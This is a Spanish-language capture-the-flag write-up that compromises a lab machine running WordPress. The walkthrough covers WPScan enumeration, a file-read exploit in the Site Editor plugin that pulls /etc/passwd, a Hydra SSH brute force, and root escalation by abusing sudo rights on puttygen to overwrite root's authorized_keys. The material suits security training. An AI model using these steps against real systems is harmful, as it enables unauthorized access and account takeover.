## Reconocimiento

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un panel de Wordpress y nos da un dominio:

```bash
http://asucar.dl
```

Utilizo Wpscan para el análisis de plugins y de usuarios:

```bash
wpscan --url http://asucar.dl --enumerate u,vp,vt,tt,cb,dbe --plugins-detection aggressive
```

Encuentro el usuario wordpress y un plugin llamado “Site Editor”. Primero pruebo fuerza bruta al usuario wordpress para ver si paso el panel de login:

```bash
wpscan —url “http://asucar.dl” -U wordpress -P ../rockyou.txt 
```

No tengo éxito.

Paso a buscar alguna vulnerabilidad en la web para el plugin y encuentro algo:

```bash
https://www.exploit-db.com/exploits/44340
```

Veo que puedo ver archivos del servidor con esta vulnerabilidad, así que veo el archivo passwd:

```bash
URL = http://asucar.dl/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

Encuentro el usuario curiosito y aprovechando que el servicio SSH esta activo paso de una con Hydra:

```bash
hydra -l curiosito -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 64
```

Encuentro la pass : password1

## Escalada

```bash
sudo -l
(root) NOPASSWD: /usr/bin/puttygen
```

Genero una clave id_rsa:

```bash
puttygen -t rsa -o id_rsa -O private-openssh
```

La copio al directorio actual con sudo:

```bash
sudo -u root puttygen id_rsa -o /root/.ssh/authorized_keys -O public-openssh
```

Le doy permisos:

```bash
chmod 600 id_rsa
```

Y entro desde el mismo servidor con el archivo malicioso generado:

```bash
ssh -i id_rsa root@localhost
```

Listo.
